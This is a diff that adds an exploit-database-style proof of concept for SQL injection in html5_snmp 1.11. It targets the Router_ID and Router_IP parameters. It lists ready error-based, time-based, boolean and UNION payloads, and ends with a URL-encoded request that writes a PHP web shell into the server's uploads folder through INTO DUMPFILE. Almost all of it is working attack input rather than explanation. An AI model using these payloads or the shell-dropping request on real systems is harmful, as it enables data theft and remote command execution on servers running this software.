@@ -1,0 +1,57 @@
+# Exploit Title: html5_snmp 1.11 - 'Router_ID' SQL Injection
+# Date: 2019-11-01
+# Exploit Author: Cakes
+# Vendor Homepage: https://github.com/lolypop55/html5_snmp
+# Software Link: https://github.com/lolypop55/html5_snmp.git
+# Version: 1.11
+# Tested on: CentOS 7
+# CVE: N/A
+
+# PoC for error, time, boolean and Union based SQL Injection
+
+# Parameter: Router_ID (POST)
+# Type: error-based
+# Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+# Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)    
+    
+Payload: Router_ID=123' AND (SELECT 9724 FROM(SELECT COUNT(*),CONCAT(0x716a7a7071,(SELECT (ELT(9724=9724,1))),0x71717a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'aJYp'='aJYp&Router_Name=123&Router_IP=123&String=123&Remark=123&Submit=Save
+
+# Type: time-based blind
+# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])   
+    
+Payload: Router_ID=123' AND (SELECT 7074 FROM (SELECT(SLEEP(5)))hDkA) AND 'koRt'='koRt&Router_Name=123&Router_IP=123&String=123&Remark=123&Submit=Save
+
+# Parameter: Router_IP (GET)
+# Type: boolean-based blind
+# Title: AND boolean-based blind - WHERE or HAVING clause
+# Vector: AND [INFERENCE]   
+    
+Payload: Router_IP=192.168.0.1' AND 3390=3390-- yUHk
+    
+# Type: time-based blind
+# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])    
+    
+Payload: Router_IP=192.168.0.1' AND (SELECT 2831 FROM (SELECT(SLEEP(5)))SwFp)-- VukE
+    
+# Type: UNION query
+# Title: Generic UNION query (NULL) - 5 columns
+# Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]    
+    
+Payload: Router_IP=192.168.0.1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a787071,0x4f4f4e6c58704e78566b76576358564c4e5145575543435658706d4e50476d6a6c65505366497571,0x7170717671),NULL-- BEdT
+
+# Pop a Shell :-)
+
+GET /get_router_show.php?Router_IP=%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%30%78%33%33%63%33%66%37%30%36%38%37%30%32%30%32%34%36%33%36%64%36%34%32%30%33%64%32%30%37%33%36%38%36%35%36%63%36%63%35%66%36%35%37%38%36%35%36%33%32%38%32%34%35%66%34%37%34%35%35%34%35%62%32%37%36%33%36%64%36%34%32%37%35%64%32%39%33%62%32%30%36%35%36%33%36%38%36%66%32%30%32%34%36%33%36%64%36%34%33%62%32%30%33%66%33%65%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%20%49%4e%54%4f%20%44%55%4d%50%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%73%6e%6d%70%30%31%2f%75%70%6c%6f%61%64%73%2f%65%78%65%63%2e%70%68%70%27%2d%2d%20%44%52%74%66 HTTP/1.1
+Host: Target
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://Target/get_router.php
+Cookie: PHPSESSID=ii1kfjgplci8vbfep3ius67353
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Cache-Control: max-age=0
